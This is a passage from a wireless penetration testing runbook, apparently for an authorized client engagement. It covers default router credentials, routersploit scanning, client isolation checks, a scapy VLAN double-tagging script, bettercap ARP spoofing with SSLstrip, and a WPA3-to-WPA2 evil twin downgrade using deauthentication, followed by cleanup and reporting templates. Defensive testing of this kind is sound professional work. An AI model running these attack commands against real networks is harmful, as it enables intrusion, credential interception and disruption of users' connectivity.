| SQL injection successful | 🔴 CRITICAL |
| XSS on admin panel | 🟠 HIGH |
| CSRF on admin functions | 🟠 HIGH |
| Admin panel on HTTP (not HTTPS) | 🟠 HIGH |

---

## TC-16 – Default Credentials Check on AP Admin Panel

### 🎯 Objective
Systematically test the AP's admin interface against a comprehensive list of default credentials for that vendor/model.

### Step 1 – Identify AP Vendor and Model
```bash
# From airodump-ng vendor column, or:
sudo nmap -sV 192.168.1.1

# Check HTTP headers for server info:
curl -I http://192.168.1.1
# Look for: Server: mini_httpd/1.30, Server: lighttpd/1.4.35, etc.

# Check SNMP sysDescr:
snmpget -v1 -c public 192.168.1.1 sysDescr.0
```

### Step 2 – Look Up Default Credentials
```bash
# Install routersploit
sudo pip3 install routersploit

# Launch routersploit
sudo rsf

# In routersploit:
use scanners/routers/router_scan
set target 192.168.1.1
run
```

### Step 3 – Manual Credential Testing
Common defaults by vendor:
```
Vendor       | Username | Password
-------------|----------|----------
Cisco        | admin    | cisco / admin
Netgear      | admin    | password
TP-Link      | admin    | admin
D-Link       | admin    | (blank)
Linksys      | admin    | admin
Asus         | admin    | admin
Ubiquiti     | ubnt     | ubnt
Mikrotik     | admin    | (blank)
Huawei       | admin    | admin
ZTE          | admin    | admin
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| Default credentials unchanged | 🔴 CRITICAL – immediate AP compromise |
| Credentials changed but weak | 🟠 HIGH |
| Strong unique credentials | 🟢 SECURE |

---

## TC-17 – Wireless Isolation & Client-to-Client Traffic Test

### 🎯 Objective
Verify that wireless client isolation is enabled — preventing devices on the same Wi-Fi from communicating directly with each other.

### ❓ Why We Do This
In guest networks or shared environments, client isolation prevents one device from attacking others on the same SSID. Many APs have this disabled by default.

### Step 1 – Connect Two Devices to Same SSID
- Device A: Your tester laptop (IP: 192.168.1.50)
- Device B: One of the client endpoint IPs (e.g., 192.168.1.100)

Both must be on the same SSID/AP.

### Step 2 – Test Direct Client-to-Client Communication
```bash
# From Device A, ping Device B directly
ping 192.168.1.100

# If ping succeeds: isolation is OFF
# If ping fails with "Request timeout": isolation is ON
```

### Step 3 – Test Port Access
```bash
# Try to scan Device B directly from Device A
sudo nmap -p 22,80,443,3389 192.168.1.100

# Try to access services
curl http://192.168.1.100
ssh admin@192.168.1.100
```

### Step 4 – Test with ARP
```bash
# Can you see Device B's MAC via ARP?
arp -a
sudo arping -I $IFACE 192.168.1.100
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| Client-to-client ping works (isolation OFF) | 🔴 HIGH – lateral movement possible |
| Port scanning between clients works | 🔴 HIGH – full attack surface exposed |
| Client-to-client blocked (isolation ON) | 🟢 SECURE |
| Isolation on main SSID but OFF on guest | 🔴 HIGH – guest users can attack each other |

---

## TC-18 – VLAN Hopping

### 🎯 Objective
If VLANs are present, test whether traffic can be sent to/from an unintended VLAN through the wireless network.

### Step 1 – Detect VLAN Tags in Traffic
```bash
sudo tshark -i $IFACE -Y "vlan" -T fields -e vlan.id -c 100
# OR in Wireshark: filter "vlan"
```

### Step 2 – VLAN Hopping via Double Tagging
```bash
# Requires scapy
sudo python3 << 'EOF'
from scapy.all import *

# Double-tagged frame: outer tag (native VLAN) + inner tag (target VLAN)
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
      Dot1Q(vlan=1) / \          # Outer = native VLAN (will be stripped by switch)
      Dot1Q(vlan=100) / \        # Inner = target VLAN
      IP(dst="10.10.100.1") / \  # IP in target VLAN
      ICMP()

sendp(pkt, iface="eth0", count=5)
print("Packets sent — check for ICMP reply from 10.10.100.1")
EOF
```

### Step 3 – Verify VLAN Segregation
```bash
# From wireless client, try to reach IPs in other VLANs
ping 10.10.200.1    # Different VLAN IP
sudo nmap -sn 10.10.0.0/16  # Scan other subnets
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| VLAN hopping successful | 🔴 CRITICAL – network segmentation broken |
| Different VLANs accessible from wireless | 🔴 HIGH |
| VLAN segregation enforced at AP/switch | 🟢 SECURE |

---

## TC-19 – SSL/TLS Traffic Inspection

### 🎯 Objective
After establishing MiTM, attempt to intercept HTTPS traffic using SSLstrip or check for certificate validation weaknesses.

### Step 1 – SSLstrip Attack
```bash
# Enable MiTM first (ARP poisoning from TC-11)

# Run SSLstrip to downgrade HTTPS to HTTP
sudo bettercap -iface $IFACE

# In bettercap:
arp.spoof on
set http.proxy.sslstrip true
set http.proxy.injectjs ''
http.proxy on
net.sniff on
```

### Step 2 – Check for HSTS (HTTP Strict Transport Security)
```bash
# Check if target sites use HSTS (SSLstrip won't work if they do)
curl -I https://target-site.com | grep -i "strict-transport"
# If present: SSLstrip blocked
# If absent: SSLstrip may work
```

### Step 3 – SSL Certificate Analysis
```bash
# Check certificate details of AP admin panel
openssl s_client -connect 192.168.1.1:443 </dev/null 2>/dev/null | \
  openssl x509 -noout -text | grep -E "Subject|Issuer|Not After|DNS"

# Check for self-signed cert
openssl s_client -connect 192.168.1.1:443 2>&1 | grep "Verify return code"
# "Verify return code: 0" = valid
# "Verify return code: 18 (self signed)" = self-signed (vulnerable)
```

### Step 4 – Testssl.sh for TLS Weaknesses
```bash
# Check for weak ciphers, old protocols (SSLv2, SSLv3, TLS 1.0)
sudo apt install testssl.sh -y
testssl.sh 192.168.1.1
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| SSLstrip successfully downgrades HTTPS | 🔴 CRITICAL – plaintext credential capture |
| Self-signed certificate on AP | 🟠 HIGH – no trust chain, easy to impersonate |
| TLS 1.0 / SSL 3.0 supported | 🟠 HIGH – POODLE/BEAST attacks |
| Weak cipher suites (RC4, DES, NULL) | 🟠 HIGH |
| HSTS present, valid cert | 🟢 GOOD |

---

## TC-20 – WPA3 / OWE Downgrade Test

### 🎯 Objective
If the AP supports WPA3 or Opportunistic Wireless Encryption (OWE), test whether it can be forced to downgrade to WPA2 or open encryption.

### ❓ Why We Do This
Transition modes (WPA2/WPA3 mixed) are vulnerable — an attacker can force clients to connect via WPA2, removing WPA3's protections.

### Step 1 – Detect WPA3 / OWE Support
```bash
sudo airodump-ng $MON
# Look for ENC: WPA3 or AUTH: SAE

# More detail:
sudo tshark -i $MON -Y "wlan.bssid == $BSSID && wlan.fc.type_subtype == 0x08" \
  -T fields -e wlan_mgt.rsn.akms.type -c 10
# Type 8 = SAE (WPA3-Personal)
# Type 18 = OWE
```

### Step 2 – Set Up WPA2-Only Evil Twin
```bash
# Create evil twin with just WPA2 (no WPA3)
cat > /tmp/downgrade_ap.conf << EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
channel=$CH
hw_mode=g
wpa=2
wpa_passphrase=testtest
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

sudo hostapd /tmp/downgrade_ap.conf
```

### Step 3 – Deauth from Real WPA3 AP
```bash
# Force clients off WPA3 AP
sudo airmon-ng start $IFACE
sudo aireplay-ng --deauth 10 -a $BSSID $MON
```

### Step 4 – Check If Client Connects to WPA2 AP
```bash
# Watch your hostapd terminal — if client associates with your WPA2 AP:
# Association confirmed = downgrade successful
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| Client accepts WPA2 downgrade | 🔴 HIGH – WPA3 protections bypassed |
| AP in WPA3-only mode (no transition) | 🟢 SECURE |
| Client refuses WPA2 downgrade | 🟢 SECURE – client-side WPA3 enforcement |
| OWE open network downgraded to open | 🔴 HIGH |

---

## Post-Testing Cleanup

**Always do this before leaving the client site:**

```bash
# Stop monitor mode and restore managed mode
sudo airmon-ng stop $MON
sudo systemctl start NetworkManager

# Stop any rogue APs
sudo pkill hostapd
sudo pkill dnsmasq

# Flush arp tables you poisoned
sudo arp -d $GW
sudo arp -d $TARGET

# Re-enable wireless to normal
sudo ip link set $IFACE up
sudo ip addr flush dev $IFACE

# Restore IP forwarding to default
sudo sysctl -w net.ipv4.ip_forward=0

# Restore MAC address if changed
sudo macchanger -p $IFACE
```

```bash
# Archive all your capture and output files
mkdir wifi_vapt_evidence_$(date +%Y%m%d)
mv tc*.txt tc*.cap tc*.pcap tc*.csv tc*.pcapng wifi_vapt_evidence_$(date +%Y%m%d)/
tar -czf wifi_vapt_evidence_$(date +%Y%m%d).tar.gz wifi_vapt_evidence_$(date +%Y%m%d)/
```

---

## Reporting Template Summary

For each test case, document the following in your report:

```
TEST CASE ID   : TC-XX
Test Name      : [Name]
Date/Time      : [When performed]
Tester         : [Your name]

FINDING        : [What was discovered]
EVIDENCE       : [Screenshot / PCAP filename / output file]
RISK LEVEL     : Critical / High / Medium / Low / Informational

DESCRIPTION    :
[What the vulnerability is and why it exists]

IMPACT         :
[What an attacker could do with this vulnerability]

RECOMMENDATION :
[Specific remediation steps for the client]

REFERENCES     :
[CVE number if applicable, OWASP, NIST guidelines]
```

---

## Quick Reference Risk Matrix

| Test Case | What You're Testing | Max Risk If Vulnerable |
|-----------|-------------------|----------------------|
| TC-01 | AP Discovery & Info Leakage | 🟡 Medium |
| TC-02 | Hidden SSID | 🟡 Medium |
| TC-03 | WPS PIN / Pixie Dust | 🔴 Critical |
| TC-04 | Handshake Capture | 🟠 High |
| TC-05 | Password Cracking | 🔴 Critical |
| TC-06 | PMKID Attack | 🔴 Critical |
| TC-07 | Deauth DoS | 🟠 High |
| TC-08 | Evil Twin / Rogue AP | 🔴 Critical |
| TC-09 | KARMA / Probe Harvest | 🔴 Critical |
| TC-10 | MiTM Traffic Intercept | 🔴 Critical |
| TC-11 | ARP Poisoning | 🔴 High |
| TC-12 | DNS Spoofing | 🔴 Critical |
| TC-13 | Endpoint Port Scan | 🟠 High |
| TC-14 | Service Enumeration | 🔴 High |
| TC-15 | Web Interface Testing | 🔴 Critical |
| TC-16 | Default Credentials | 🔴 Critical |
| TC-17 | Client Isolation | 🔴 High |
| TC-18 | VLAN Hopping | 🔴 Critical |
| TC-19 | SSL/TLS Weakness | 🔴 Critical |
| TC-20 | WPA3 Downgrade | 🟠 High |

---

## 🔖 Final Notes for Tomorrow

1. **Arrive early** — set up your Kali laptop, verify your wireless adapter is in monitor mode before the client is watching.
2. **Note everything** — run `script session.log` at the start to capture all terminal output automatically.
3. **Take screenshots** of every significant finding — airodump output, successful cracks, Nmap results.
4. **Don't panic** if a tool fails — say "let me verify the interface configuration" and troubleshoot calmly.
5. **Do TC-01 first**, always — it gives you the foundation for everything else.
6. **Start conservative** — run passive scans first (TC-01, TC-02), then active attacks.
7. **Confirm with client** before running disruptive tests (TC-07 deauth, TC-08 evil twin) — these affect real users.

Good luck — you've got this! 💪

---
*Document generated for authorized VAPT use only. All testing must be performed with explicit written permission.*
